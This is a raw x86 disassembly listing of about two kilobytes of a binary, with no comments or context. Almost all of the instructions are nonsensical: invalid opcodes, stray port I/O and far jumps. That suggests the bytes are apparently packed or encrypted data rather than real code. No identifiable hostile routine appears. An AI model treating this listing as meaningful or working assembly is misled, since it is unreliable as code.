  4028f1:	adc    dl,BYTE PTR ds:0x68c51b6f
  4028f7:	add    al,0xba
  4028f9:	push   0xffffff8c
  4028fb:	jnp    0x40292b
  4028fd:	jb     0x4028ef
  4028ff:	rol    edi,cl
  402901:	mov    dl,0x9b
  402903:	icebp  
  402904:	add    bl,BYTE PTR [ebx-0x46846090]
  40290a:	div    DWORD PTR [esp+edx*1]
  40290d:	fistp  QWORD PTR [edx+0x41707dc2]
  402913:	add    al,0x58
  402915:	(bad)  
  402916:	fcomp  st(2)
  402918:	jmp    DWORD PTR [esp+ebp*4-0x10]
  40291c:	mov    edx,0xae851ef4
  402921:	ret    
  402922:	jb     0x402900
  402924:	jmp    DWORD PTR [esi-0x58]
  402927:	arpl   WORD PTR fs:[esi-0x5b9a0e2e],dx
  40292e:	popa   
  40292f:	enter  0x3589,0x7b
  402933:	dec    ecx
  402934:	xor    DWORD PTR [eax+edx*2+0x8],ecx
  402938:	pop    edi
  402939:	hlt    
  40293a:	jp     0x402937
  40293c:	ins    DWORD PTR es:[edi],dx
  40293d:	cdq    
  40293e:	lods   eax,DWORD PTR ds:[esi]
  40293f:	stos   DWORD PTR es:[edi],eax
  402940:	in     eax,0xce
  402942:	xor    dh,ch
  402944:	inc    BYTE PTR [edx+0x31f8b5e7]
  40294a:	push   edx
  40294b:	lock cli 
  40294d:	adc    BYTE PTR [ebx-0x913e60d],al
  402953:	gs xchg ebp,eax
  402955:	imul   esi,DWORD PTR [eax-0x13],0x5
  402959:	jge    0x40295e
  40295b:	mov    eax,ds:0x65ca1d48
  402960:	and    ebp,DWORD PTR [esi-0x11a9478d]
  402966:	jae    0x40295b
  402968:	jb     0x402947
  40296a:	sbb    al,0x67
  40296c:	xlat   BYTE PTR ds:[ebx]
  40296d:	pop    ebp
  40296e:	leave  
  40296f:	je     0x40297e
  402971:	jo     0x40295c
  402973:	(bad)
  402977:	add    al,0x3b
  402979:	call   0x8361:0xda8abf31
  402980:	adc    BYTE PTR ds:0x7d780f6a,0xae
  402987:	cmp    al,0x73
  402989:	jae    0x4029fa
  40298b:	or     dh,BYTE PTR [ecx-0x274724b0]
  402991:	cdq    
  402992:	aad    0x4
  402994:	test   dl,ch
  402996:	cmp    BYTE PTR [ebp+0x60],ah
  402999:	cmp    bh,BYTE PTR [ecx+0x3e]
  40299c:	(bad)  
  40299d:	aas    
  40299e:	adc    al,0x22
  4029a0:	cmc    
  4029a1:	xchg   ecx,eax
  4029a2:	(bad)  
  4029a3:	inc    ebp
  4029a4:	popa   
  4029a5:	adc    edx,DWORD PTR [edi+eiz*4]
  4029a8:	add    al,0x81
  4029aa:	icebp  
  4029ab:	push   edi
  4029ac:	into   
  4029ad:	fcomp  DWORD PTR [edx-0x1f]
  4029b0:	cmp    DWORD PTR [ecx],eax
  4029b2:	xlat   BYTE PTR ds:[ebx]
  4029b3:	gs dec ebx
  4029b5:	mov    BYTE PTR [edi-0x10],bl
  4029b8:	dec    ebx
  4029b9:	addr16 sub eax,0x43b1253f
  4029bf:	pusha  
  4029c0:	(bad)  
  4029c2:	mov    ebx,0xe61a27d1
  4029c7:	inc    eax
  4029c8:	out    dx,eax
  4029c9:	mov    al,ds:0x23eb2c7c
  4029ce:	outs   dx,DWORD PTR ds:[esi]
  4029cf:	adc    ebx,DWORD PTR [eax]
  4029d1:	lock in al,dx
  4029d3:	or     eax,0x8bfd1a2
  4029d8:	adc    al,0x92
  4029da:	das    
  4029db:	mov    eax,ds:0xaa500fee
  4029e0:	fwait
  4029e1:	or     esp,eax
  4029e3:	pop    ebp
  4029e4:	pop    ds
  4029e5:	pop    ecx
  4029e6:	inc    eax
  4029e7:	in     eax,dx
  4029e8:	push   ecx
  4029e9:	jae    0x40298e
  4029eb:	aaa    
  4029ec:	or     ah,BYTE PTR [ecx]
  4029ee:	mov    al,0x1a
  4029f0:	cmp    BYTE PTR ds:0xa7ed5458,bh
  4029f6:	outs   dx,DWORD PTR ds:[esi]
  4029f7:	xchg   edx,eax
  4029f8:	jno    0x4029f3
  4029fa:	pusha  
  4029fb:	stc    
  4029fc:	cs ins DWORD PTR es:[edi],dx
  4029fe:	in     al,0x22
  402a00:	daa    
  402a01:	push   esp
  402a02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a03:	out    dx,eax
  402a04:	add    ecx,edx
  402a06:	call   0xa6d2:0x8744c3e8
  402a0d:	in     eax,0x38
  402a0f:	jmp    0x6b7ea0db
  402a14:	cmp    ebx,edx
  402a16:	(bad)  
  402a17:	test   al,0xc3
  402a19:	add    BYTE PTR [ebp-0x5],ch
  402a1c:	mov    al,BYTE PTR ds:0x99104e8b
  402a22:	mov    esp,DWORD PTR [eax-0x34]
  402a25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a26:	add    edx,0xffffff95
  402a29:	mov    dh,0x93
  402a2b:	data16 mov ds:0xa1fa0250,al
  402a31:	pop    edx
  402a32:	fs inc esi
  402a34:	call   0x473a:0xeb2e641c
  402a3b:	ret    0xa571
  402a3e:	in     eax,0x4b
  402a40:	jmp    0x402a13
  402a42:	aad    0xb1
  402a44:	mov    ds:0x4e8dd2c,eax
  402a49:	cmp    esp,DWORD PTR [eax+ecx*2+0xa5cb7c5]
  402a50:	or     bl,al
  402a52:	adc    al,0xbb
  402a54:	mov    eax,ds:0x593d3bbc
  402a59:	(bad)  
  402a5a:	cmp    eax,0x17e49d9f
  402a5f:	(bad)  
  402a60:	xor    BYTE PTR [eax],dh
  402a62:	sub    al,0xab
  402a64:	xchg   ecx,eax
  402a65:	inc    BYTE PTR [edx]
  402a67:	(bad)  
  402a68:	outs   dx,BYTE PTR ds:[esi]
  402a69:	iret   
  402a6a:	mov    esp,0x666d52e5
  402a6f:	(bad)  
  402a70:	ds iret 
  402a72:	outs   dx,DWORD PTR ds:[esi]
  402a73:	adc    DWORD PTR ds:0x6b8f4fef,ebx
  402a79:	mov    al,ds:0xd7ab083
  402a7e:	mov    ebx,DWORD PTR [ebp+0x76]
  402a81:	gs push es
  402a83:	push   eax
  402a84:	out    0xf7,eax
  402a86:	and    BYTE PTR ds:0xcfb4f83d,ah
  402a8c:	xchg   ecx,eax
  402a8d:	rol    BYTE PTR [esi+0x7],cl
  402a90:	or     al,0xc1
  402a92:	and    BYTE PTR ds:[ebx-0x1d],dh
  402a96:	jg     0x402ae7
  402a98:	jne    0x402a59
  402a9a:	enter  0xb322,0xb8
  402a9e:	in     al,dx
  402a9f:	and    dl,BYTE PTR [ebx+0x7a]
  402aa2:	sbb    al,0x9
  402aa4:	dec    edx
  402aa5:	or     BYTE PTR [esi],ah
  402aa7:	pop    ds
  402aa8:	mov    al,ds:0x37a44503
  402aad:	mov    cl,0x26
  402aaf:	cmp    al,0xd1
  402ab1:	add    eax,0x9d593bc0
  402ab6:	dec    eax
  402ab7:	adc    BYTE PTR [edi],0xb
  402aba:	jmp    0xabd2a48c
  402abf:	push   ss
  402ac0:	push   esi
  402ac1:	add    ebp,ebx
  402ac3:	loope  0x402a75
  402ac5:	sbb    BYTE PTR [ebx],dh
  402ac7:	and    DWORD PTR [ebx],esp
  402ac9:	mov    cl,0xb5
  402acb:	cmp    esp,0xffffff95
  402ace:	js     0x402b37
  402ad0:	test   eax,0x72e1592d
  402ad5:	leave  
  402ad6:	push   ebp
  402ad7:	(bad)  
  402ad8:	lods   eax,DWORD PTR ds:[esi]
  402ad9:	xchg   esp,ebp
  402adb:	inc    esp
  402adc:	sbb    dh,dl
  402ade:	aaa    
  402adf:	retf   
  402ae0:	pop    esp
  402ae1:	sbb    al,0x8a
  402ae3:	test   BYTE PTR [esi+0x2b8b4333],0x6a
  402aea:	xor    dl,BYTE PTR [ecx]
  402aec:	pop    esi
  402aed:	add    DWORD PTR [edi-0x1dfe2ae2],edx
  402af3:	out    0x8e,eax
  402af5:	sub    BYTE PTR [esi],dh
  402af7:	stos   DWORD PTR es:[edi],eax
  402af8:	hlt    
  402af9:	retf   
  402afa:	outs   dx,BYTE PTR ds:[esi]
  402afb:	int3   
  402afc:	mov    ch,dl
  402afe:	cmp    BYTE PTR [eax+0x4eede7cc],dl
  402b04:	ret    
  402b05:	pop    ebp
  402b06:	sbb    DWORD PTR [ecx-0x77],ecx
  402b09:	ds test al,0x2a
  402b0c:	pushf  
  402b0d:	mov    ecx,0xe9c82b6b
  402b12:	call   0xc2c8:0xc0000002
  402b19:	int    0xda
  402b1b:	rcr    ebx,1
  402b1d:	aad    0x7b
  402b1f:	bound  ebp,QWORD PTR [esi+0x37]
  402b22:	xchg   ebx,eax
  402b24:	outs   dx,DWORD PTR ds:[esi]
  402b25:	mov    ds:0x7878128e,al
  402b2a:	(bad)  
  402b2b:	jle    0x402ba5
  402b2d:	js     0x402b82
  402b2f:	and    eax,0xa5e21c03
  402b34:	push   ss
  402b35:	retf   0x8a8
  402b38:	jl     0x402ae9
  402b3a:	inc    BYTE PTR [edx]
  402b3c:	cmp    eax,DWORD PTR [edi+0x5]
  402b3f:	inc    eax
  402b40:	out    0x48,al
  402b42:	xor    edx,DWORD PTR [esi]
  402b44:	jnp    0x402bb4
  402b46:	in     eax,0xe7
  402b48:	(bad)  
  402b4a:	jns    0x402acf
  402b4c:	cdq    
  402b4d:	jecxz  0x402bcd
  402b4f:	cli    
  402b50:	jle    0x402b9e
  402b52:	adc    DWORD PTR [edi+esi*1],ebp
  402b55:	jl     0x402b31
  402b57:	stos   BYTE PTR es:[edi],al
  402b58:	into   
  402b59:	push   eax
  402b5a:	xchg   ebp,eax
  402b5b:	push   es
  402b5c:	in     eax,0x4c
  402b5e:	xchg   ah,al
  402b60:	or     BYTE PTR [eax+ecx*4+0x48],dl
  402b64:	(bad)  
  402b65:	lahf   
  402b66:	mov    dl,0x27
  402b68:	stc    
  402b69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b6a:	es aad 0x1
  402b6d:	gs and bh,cl
  402b70:	and    eax,0xeab2c75d
  402b76:	mov    eax,ds:0x4966290d
  402b7b:	es and eax,0xba269836
  402b81:	dec    ebp
  402b82:	dec    esp
  402b83:	xor    bl,al
  402b85:	sub    eax,0x5b80623c
  402b8a:	pop    es
  402b8b:	pop    edi
  402b8c:	dec    edi
  402b8d:	push   esi
  402b8e:	mov    al,0x3e
  402b90:	dec    edx
  402b91:	lods   al,BYTE PTR ds:[esi]
  402b92:	or     ah,BYTE PTR [edi+0x74]
  402b95:	clc    
  402b96:	xor    DWORD PTR [esi+0x50],eax
  402b99:	repz xor eax,0x8b51e2d3
  402b9f:	in     al,dx
  402ba0:	aad    0xd4
  402ba2:	(bad)  
  402ba4:	pop    edx
  402ba5:	imul   eax,DWORD PTR ds:0xf7d8647,0xffffffb0
  402bac:	push   es
  402bad:	adc    eax,0x5b073743
  402bb2:	mov    ebp,0x360aa097
  402bb7:	mov    bl,0xdc
  402bb9:	dec    ebx
  402bba:	pop    ebx
  402bbb:	sbb    bh,bh
  402bbd:	cmp    dl,ah
  402bbf:	adc    ecx,DWORD PTR [esi-0x38391c3]
  402bc5:	push   esi
  402bc6:	jbe    0x402b72
  402bc8:	outs   dx,BYTE PTR ds:[esi]
  402bc9:	es push eax
  402bcb:	xlat   BYTE PTR ds:[ebx]
  402bcc:	inc    ecx
  402bcd:	sub    ch,BYTE PTR [eax]
  402bcf:	push   esi
  402bd0:	repz and DWORD PTR [ebp-0x35],esp
  402bd4:	loope  0x402c38
  402bd6:	aad    0x20
  402bd8:	and    ebx,DWORD PTR [eax]
  402bda:	test   eax,0x6f131bf2
  402bdf:	adc    eax,0x923ee742
  402be4:	mov    edx,0x3c57384c
  402be9:	shl    BYTE PTR [edx-0x67f1ba8c],1
  402bef:	or     al,0xd8
  402bf1:	hlt    
  402bf2:	mov    bh,0xe4
  402bf4:	pop    ebp
  402bf5:	data16 mov ch,dl
  402bf8:	and    eax,0xe7bdd1bf
  402bfd:	pusha  
  402bfe:	lods   eax,DWORD PTR ds:[esi]
  402bff:	daa    
  402c00:	xchg   ebx,eax
  402c01:	and    eax,0xf972467e
  402c06:	inc    esp
  402c07:	loope  0x402bef
  402c09:	cli    
  402c0a:	mov    eax,ds:0xbb23fa4
  402c0f:	ret    
  402c10:	adc    ah,al
  402c12:	mov    esi,0xbe4e307e
  402c17:	loopne 0x402c2c
  402c19:	call   0xdbb3:0x49bbec20
  402c20:	xor    ebx,ebp
  402c22:	ins    DWORD PTR es:[edi],dx
  402c23:	(bad)  
  402c24:	mov    bh,dh
  402c26:	sub    edx,DWORD PTR [ebx-0x58]
  402c29:	sub    BYTE PTR [edi+0x7c],ch
  402c2c:	push   0xffffffb0
  402c2e:	fdivr  DWORD PTR [ecx+0x5329ecdb]
  402c34:	push   ds
  402c35:	cmp    eax,0x5bfa69c6
  402c3a:	scas   eax,DWORD PTR es:[edi]
  402c3b:	stos   DWORD PTR es:[edi],eax
  402c3c:	pop    esi
  402c3d:	fld    st(6)
  402c3f:	mov    al,0x35
  402c41:	adc    edx,ebp
  402c43:	xlat   BYTE PTR ds:[ebx]
  402c44:	pop    eax
  402c45:	push   esp
  402c46:	test   al,0x1a
  402c48:	(bad)  [esp+ebp*2]
  402c4b:	bound  edi,QWORD PTR [ecx]
  402c4d:	stos   BYTE PTR es:[edi],al
  402c4e:	(bad)  
  402c4f:	sub    eax,0x1bb47427
  402c54:	xchg   ebx,eax
  402c55:	mov    dh,0x2d
  402c57:	cmp    eax,0xd6c86c34
  402c5c:	rcr    BYTE PTR [eax+0x1e],1
  402c5f:	jo     0x402cc3
  402c61:	nop
  402c62:	mov    ecx,0x30ef4e8c
  402c67:	push   esp
  402c68:	cmp    DWORD PTR [edi],0x4d3ae7f1
  402c6e:	out    dx,eax
  402c6f:	mov    ch,0x69
  402c71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c72:	popf   
  402c73:	stos   DWORD PTR es:[edi],eax
  402c74:	lahf   
  402c75:	jae    0x402cde
  402c77:	lea    eax,[edi]
  402c79:	mov    ss,esp
  402c7b:	cmp    ch,cl
  402c7d:	cmc    
  402c7e:	dec    edx
  402c7f:	inc    edi
  402c80:	loope  0x402c53
  402c82:	adc    ax,0x5d56
  402c86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c87:	sub    cl,dh
  402c89:	jne    0x402c76
  402c8b:	out    dx,al
  402c8c:	cld    
  402c8d:	out    0x98,eax
  402c8f:	inc    esp
  402c90:	xchg   edx,eax
  402c91:	or     eax,0x2f8a855a
  402c96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c97:	pop    esi
  402c98:	fdiv   DWORD PTR [edi]
  402c9a:	imul   esi,DWORD PTR [esi-0x5a],0x21
  402c9e:	sbb    eax,0xa0e5ca4b
  402ca3:	jb     0x402d0d
  402ca5:	adc    edx,DWORD PTR [edi+ebx*4+0x32]
  402ca9:	xor    BYTE PTR [edi+0x34bec6f3],ch
  402caf:	out    0x29,eax
  402cb1:	ins    BYTE PTR es:[edi],dx
  402cb2:	ins    DWORD PTR es:[edi],dx
  402cb3:	push   eax
  402cb4:	or     DWORD PTR [ebx+0xf],ebx
  402cb7:	or     eax,0x2610af62
  402cbc:	outs   dx,DWORD PTR ds:[esi]
  402cbd:	lods   eax,DWORD PTR ds:[esi]
  402cbe:	inc    edx
  402cbf:	push   DWORD PTR [esi-0x51]
  402cc2:	adc    eax,0xf62b32bb
  402cc7:	or     BYTE PTR [edx],al
  402cc9:	imul   ebx,DWORD PTR [eax-0x772bbc75],0xb9938209
  402cd3:	outs   dx,BYTE PTR ds:[esi]
  402cd4:	mov    ah,0xac
  402cd6:	shl    ebx,1
  402cd8:	fnsave [edx+0x66]
  402cdb:	stc    
  402cdc:	int3   
  402cdd:	cdq    
  402cde:	cmp    dl,BYTE PTR [edi-0x702b34e2]
  402ce4:	out    dx,eax
  402ce5:	inc    esp
  402ce6:	mov    al,ds:0x57ea16b9
  402ceb:	cmp    DWORD PTR [ebx+0x16671162],edx
  402cf1:	adc    BYTE PTR [ecx-0x9],dh
  402cf4:	out    dx,eax
  402cf5:	call   0xdcd9866c
  402cfa:	cmp    al,0x7a
  402cfc:	push   cs
  402cfd:	scas   al,BYTE PTR es:[edi]
  402cfe:	js     0x402cdf
  402d00:	push   edi
  402d01:	cmp    al,0x55
  402d03:	add    eax,0x6804645b
  402d08:	pusha  
  402d09:	mov    ch,0x61
  402d0b:	cmp    al,dh
  402d0d:	mov    ah,0x9e
  402d0f:	xor    ah,BYTE PTR [ebx-0x6f]
  402d12:	xor    edi,DWORD PTR [ebp+0x5a]
  402d15:	add    al,0x31
  402d17:	leave  
  402d18:	xchg   esi,eax
  402d19:	mov    ds:0x7b5df3f8,al
  402d1e:	repz (bad) 
  402d20:	and    eax,0x92c378da
  402d25:	push   es
  402d26:	xchg   ebp,eax
  402d27:	mov    dh,0x28
  402d29:	cwde   
  402d2a:	repz jecxz 0x402d9a
  402d2d:	mov    esp,0x4e5de384
  402d32:	add    edi,ebx
  402d34:	loopne 0x402d04
  402d36:	xor    DWORD PTR [ecx+0x391d5f9b],eax
  402d3c:	lds    ebp,FWORD PTR [edi+0x27]
  402d3f:	adc    bl,BYTE PTR [edx+edi*2]
  402d42:	pop    ebp
  402d43:	daa    
  402d44:	mov    ds:0x49c930e2,eax
  402d49:	dec    eax
  402d4a:	and    al,0xcf
  402d4c:	adc    eax,0x87172366
  402d51:	mov    ds:0x3115fc42,al
  402d56:	ret    0x9c20
  402d59:	imul   DWORD PTR [edx-0x56]
  402d5c:	add    al,0x24
  402d5e:	pop    ds
  402d5f:	xchg   esi,eax
  402d60:	call   0x14f4:0x2c7debf8
  402d67:	xchg   DWORD PTR [ebx+0x305c82a3],esp
  402d6d:	icebp  
  402d6e:	xor    eax,esp
  402d70:	xor    ebp,DWORD PTR [esi+eiz*8+0x2545c897]
  402d77:	les    edx,FWORD PTR [ecx-0x44]
  402d7a:	rcl    DWORD PTR [ecx+0x225a017f],cl
  402d80:	sub    eax,0xe6feeb39
  402d85:	mov    al,bl
  402d87:	out    0x55,eax
  402d89:	xchg   edx,eax
  402d8a:	push   0x7a2e35d
  402d8f:	and    al,0x5f
  402d91:	xchg   DWORD PTR [ecx],esp
  402d93:	in     al,0xa9
  402d95:	push   ss
  402d96:	adc    eax,0xec72d2d9
  402d9b:	out    dx,al
  402d9c:	and    ah,BYTE PTR [ecx*4-0x3799782b]
  402da3:	idiv   BYTE PTR [ecx+edi*4]
  402da6:	or     ah,BYTE PTR [esi]
  402da8:	add    esp,DWORD PTR [esi]
  402daa:	cmp    DWORD PTR [edx+ebx*4],edi
  402dad:	mov    esi,ebp
  402daf:	lock sub ecx,edi
  402db2:	mov    WORD PTR [ebp-0x4],cx
  402db6:	jmp    0x402dc8
  402dbb:	xor    eax,esi
  402dbd:	lea    eax,[eax+ecx*1+0x327298]
  402dc4:	mov    WORD PTR [ebp-0x4],ax
  402dc8:	mov    eax,DWORD PTR [ebp-0xc]
  402dcb:	cmp    eax,ebx
  402dcd:	je     0x403080
  402dd3:	mov    eax,DWORD PTR [ebp-0x8]
  402dd6:	mov    DWORD PTR [eax],0x60341eb0
  402ddc:	jmp    0x404380
  402de1:	jmp    0x403080
  402de6:	(bad)  
  402de7:	leave  
  402de8:	(bad)  
  402de9:	vpsubusw xmm2,xmm4,xmm5
  402ded:	leave  
  402dee:	repnz int 0x29
  402df1:	cld    
  402df2:	jbe    0x402dbc
  402df4:	fcmovu st,st(5)
  402df6:	or     al,0x17
  402df8:	js     0x402e72
  402dfa:	(bad)  
  402dfb:	jle    0x402e75
  402dfd:	js     0x402d81
  402dff:	mov    eax,ds:0x85d77bb8
  402e04:	cli    
  402e05:	xor    al,0xd5
  402e07:	sub    DWORD PTR [edx],ecx
  402e09:	add    al,0xf4
  402e0b:	adc    edx,eax
  402e0d:	cmp    eax,0x987e0a49
  402e12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e13:	add    bh,dh
  402e15:	mov    esi,0x13a29d23
  402e1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e1b:	leave  
  402e1c:	gs sar al,cl
  402e1f:	retf   0x30b5
  402e22:	call   0x3724:0x817ead42
  402e29:	add    BYTE PTR [ecx+0x26],dl
  402e2c:	out    0x1c,al
  402e2e:	or     DWORD PTR [esi],edi
  402e30:	cmp    ebx,eax
  402e32:	aas    
  402e33:	ret    0x9f33
  402e36:	mov    cs,WORD PTR [edx+eax*4]
  402e39:	sbb    ebx,DWORD PTR ds:[ecx]
  402e3c:	xlat   BYTE PTR ds:[ebx]
  402e3d:	mov    DWORD PTR [edx+0x153963f0],ecx
  402e43:	rcr    BYTE PTR [edx+0x2e66a24a],0xdb
  402e4a:	add    edi,DWORD PTR [ebx+0x8c2fb64]
  402e50:	xor    BYTE PTR [ebx+ecx*8+0x18713b4],0x9a
  402e58:	sbb    esp,DWORD PTR [eax+0x47fbd0c1]
  402e5e:	outs   dx,DWORD PTR ds:[esi]
  402e5f:	add    ebp,DWORD PTR [edi+0x5529b602]
  402e65:	and    eax,0x20b75ff0
  402e6a:	jb     0x402e42
  402e6c:	imul   esp,DWORD PTR [ecx-0x36e87815],0xd4f45798
  402e76:	mov    ?,WORD PTR [eax+0x72]
  402e79:	jmp    0x399c5857
  402e7e:	or     al,0xdf
  402e80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e81:	and    al,0x2c
  402e83:	fadd   QWORD PTR [eax+0x9]
  402e86:	push   0x62b03083
  402e8b:	sub    dh,bh
  402e8d:	cdq    
  402e8e:	sbb    BYTE PTR [eax+0x8c2a09],cl
  402e94:	lahf   
  402e95:	or     dh,cl
  402e97:	mov    gs,esp
  402e99:	xor    ecx,ebx
  402e9b:	pop    ebp
  402e9c:	mov    dh,0xc3
  402e9e:	inc    ecx
  402e9f:	repnz cli 
  402ea1:	pop    edx
  402ea2:	in     eax,0x89
  402ea4:	sub    BYTE PTR [edx-0x3e4d7104],bh
  402eaa:	es fwait
  402eac:	push   0x1c48dc66
  402eb1:	sbb    al,0x14
  402eb3:	popa   
  402eb4:	dec    edx
  402eb5:	add    al,0xe3
  402eb7:	jae    0x402e50
  402eb9:	pop    ss
  402eba:	cmp    BYTE PTR [esi+0x41c2ceac],dh
  402ec0:	je     0x402e58
  402ec2:	ja     0x402f27
  402ec4:	sti    
  402ec5:	enter  0x2a47,0xed
  402ec9:	mov    eax,0xada41b91
  402ece:	add    eax,DWORD PTR [edx+0x29]
  402ed1:	jne    0x402f01
  402ed3:	lock stos DWORD PTR es:[edi],eax
  402ed5:	pop    ebp
  402ed6:	bound  ecx,QWORD PTR [ecx+eiz*1-0x69]
  402eda:	inc    eax
  402edb:	xor    ch,BYTE PTR [esi+0x12]
  402ede:	fist   WORD PTR [eax+0x18]
  402ee1:	ds call 0x2fc73fc5
  402ee7:	cmp    esp,edx
  402ee9:	push   ds
  402eea:	sbb    DWORD PTR [eax-0x4ce97480],0xffffff87
  402ef1:	js     0x402ee4
  402ef3:	nop
  402ef4:	sbb    DWORD PTR [esi+0x38410365],0x1e
  402efb:	div    BYTE PTR [esi+eax*1-0xd]
  402eff:	out    0x12,eax
  402f01:	dec    edx
  402f02:	jno    0x402ede
  402f04:	out    0x32,eax
  402f06:	sub    eax,DWORD PTR ds:0x4b87c858
  402f0c:	xlat   BYTE PTR fs:[ebx]
  402f0e:	push   ds
  402f0f:	jl     0x402f8a
  402f11:	jo     0x402f3a
  402f13:	cmc    
  402f14:	mov    ah,0x3
  402f16:	pop    ecx
  402f17:	xchg   DWORD PTR [ebp+0x5d],ebp
  402f1a:	xlat   BYTE PTR ds:[ebx]
  402f1b:	sub    esi,esp
  402f1d:	test   al,0x64
  402f1f:	inc    esp
  402f20:	ror    BYTE PTR [esi-0x62],1
  402f23:	and    eax,0xd01c50f6
  402f28:	das    
  402f29:	xor    dl,BYTE PTR [ebx]
  402f2b:	mov    edx,0xdd292d05
  402f30:	(bad)  
  402f31:	xor    edi,ecx
  402f33:	pop    esi
  402f34:	rol    ah,1
  402f36:	pop    esi
  402f37:	test   BYTE PTR [edi+0x2a],dh
  402f3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f3b:	jmp    0x12a61d4e
  402f40:	mov    dh,BYTE PTR [eax+0x25]
  402f43:	pop    ds
  402f44:	jecxz  0x402f31
  402f46:	pop    esi
  402f47:	add    eax,0x9f482a28
  402f4c:	push   eax
  402f4d:	sub    bh,BYTE PTR [edi+0x22]
  402f50:	jb     0x402ef7
  402f52:	out    dx,eax
  402f53:	mov    dl,0xe6
  402f55:	dec    ebp
  402f56:	jecxz  0x402f06
  402f58:	or     ah,BYTE PTR [esi]
  402f5a:	xchg   esi,eax
  402f5b:	fcmovb st,st(2)
  402f5d:	std    
  402f5e:	lods   eax,DWORD PTR ds:[esi]
  402f5f:	cmp    bh,dh
  402f61:	mov    BYTE PTR [eax-0x5],0xd3
  402f65:	adc    dh,BYTE PTR [ebp+esi*4+0x3c96af92]
  402f6c:	outs   dx,DWORD PTR ds:[esi]
  402f6d:	pop    eax
  402f6e:	ror    DWORD PTR [esi],cl
  402f70:	and    ebx,ebx
  402f72:	inc    ebx
  402f73:	and    eax,0xd9c11dba
  402f78:	ror    eax,cl
  402f7a:	xchg   DWORD PTR [edi+ebx*1+0x1b],edi
  402f7e:	pop    ss
  402f7f:	adc    bh,BYTE PTR [edx]
  402f81:	push   0xb6e7abea
  402f86:	sbb    ecx,DWORD PTR [esi-0x64]
  402f89:	mov    eax,ds:0x19649f44
  402f8e:	push   ds
  402f8f:	cmc    
  402f90:	int3   
  402f91:	jns    0x402f25
  402f93:	push   edx
  402f94:	mov    cl,0x7c
  402f96:	xor    al,0x6c
  402f98:	bound  ebx,QWORD PTR [eax]
  402f9a:	int3   
  402f9b:	or     eax,0xa18fc255
  402fa0:	mov    bh,0x8a
  402fa2:	imul   BYTE PTR [ebp+edi*8-0x1260a8c5]
  402fa9:	pop    ds
  402faa:	sub    al,0xa8
  402fac:	addr16 jbe 0x402f92
  402faf:	data16 stos BYTE PTR es:[edi],al
  402fb1:	sbb    edi,edi
  402fb3:	mov    edi,0x66cba59f
  402fb8:	pop    eax
  402fb9:	nop
  402fba:	or     BYTE PTR [esi+ebx*1+0x6d],cl
  402fbe:	aaa    
  402fbf:	xchg   ebp,eax
  402fc0:	push   cs
  402fc1:	cmp    esp,edi
  402fc3:	js     0x402fcc
  402fc5:	push   esp
  402fc6:	mov    cl,0xcf
  402fc8:	xchg   ebx,eax
  402fc9:	xor    bl,bh
  402fcb:	mov    bl,ah
  402fcd:	addr16 mov es,edi
  402fd0:	push   edi
  402fd1:	popa   
  402fd2:	stc    
  402fd3:	lods   al,BYTE PTR ds:[esi]
  402fd4:	imul   edx,DWORD PTR [ebx-0x6adc4cc3],0x6
  402fdb:	jo     0x402f6a
  402fdd:	xchg   BYTE PTR [edx],al
  402fdf:	aas    
  402fe0:	aam    0xdb
  402fe2:	pop    edx
  402fe3:	bound  ebx,QWORD PTR [esi+0x16]
  402fe6:	push   eax
  402fe7:	and    BYTE PTR [ebp-0x591a889f],0x49
  402fee:	jmp    0xd5a534e4
  402ff3:	sti    
  402ff4:	dec    eax
  402ff5:	push   esi
  402ff6:	pusha  
  402ff7:	mov    cl,0x76
  402ff9:	push   ebx
  402ffa:	adc    BYTE PTR [ecx+0x27],ah
  402ffd:	(bad)  
  402fff:	cmp    BYTE PTR [edx-0x1a0c8070],bl
  403005:	call   0x9d8e:0x36bba4f0
  40300c:	adc    al,ah
  40300e:	add    eax,0xba527527
  403013:	sahf   
  403014:	jb     0x402fdd
  403016:	mov    ecx,0xb975ce18
  40301b:	add    al,0x27
  40301d:	das    
  40301e:	out    0xf6,al
  403020:	xchg   esp,eax
  403021:	imul   eax,DWORD PTR [ecx],0x14e8985
  403027:	add    al,0x41
  403029:	mov    ecx,0xc148a9c6
  40302e:	or     bh,dl
  403030:	scas   eax,DWORD PTR es:[edi]
  403031:	rol    edx,1
  403033:	icebp  
  403034:	in     eax,dx
  403035:	jmp    FWORD PTR [ecx]
  403037:	inc    edi
  403038:	scas   al,BYTE PTR es:[edi]
  403039:	xor    eax,0xf6754684
  40303e:	jp     0x402fdc
  403040:	mov    ecx,0xca574d1d
  403045:	inc    ebx
  403046:	and    eax,0xdad510d6
  40304b:	cmp    al,BYTE PTR [esi]
  40304d:	js     0x402fd1
  40304f:	fadd   DWORD PTR [edx-0x75]
  403052:	xor    BYTE PTR [edx],dl
  403054:	rol    DWORD PTR [ecx+esi*1+0x66a7b416],cl
  40305b:	cmp    ecx,DWORD PTR [ecx+eax*8]
  40305e:	jne    0x403046
  403060:	sub    DWORD PTR [ebx+0x3b],esi
  403063:	push   eax
  403064:	popa   
  403065:	push   ds
  403066:	xlat   BYTE PTR ds:[ebx]
  403067:	xor    al,0xbd
  403069:	fdivr  DWORD PTR [edi-0x36561ebd]
  40306f:	adc    edx,ebx
  403071:	dec    ebp
  403072:	and    eax,0x7
  403075:	lea    ebx,[edi-0x7895b3e9]
  40307b:	cld    
  40307c:	mov    dl,0x85
  40307e:	fnsave [esi-0x74f7ba75]
  403084:	dec    ebp
  403085:	clc    
  403086:	jmp    0x403325
  40308b:	ror    esp,1
  40308d:	ror    edx,1
  40308f:	ror    ecx,1
  403091:	(bad)  
  403093:	test   al,0x59
  403095:	xchg   ebx,eax
  403096:	push   edx
  403097:	inc    edi
  403098:	inc    ecx
  403099:	data16 sbb BYTE PTR [edx-0x18787eb],dl
  4030a0:	jle    0x40311a
  4030a2:	js     0x403062
  4030a4:	push   edi
  4030a5:	inc    ebx
  4030a6:	ret    0xadf9
  4030a9:	std    
  4030aa:	sti    
  4030ab:	jno    0x403096
  4030ad:	das    
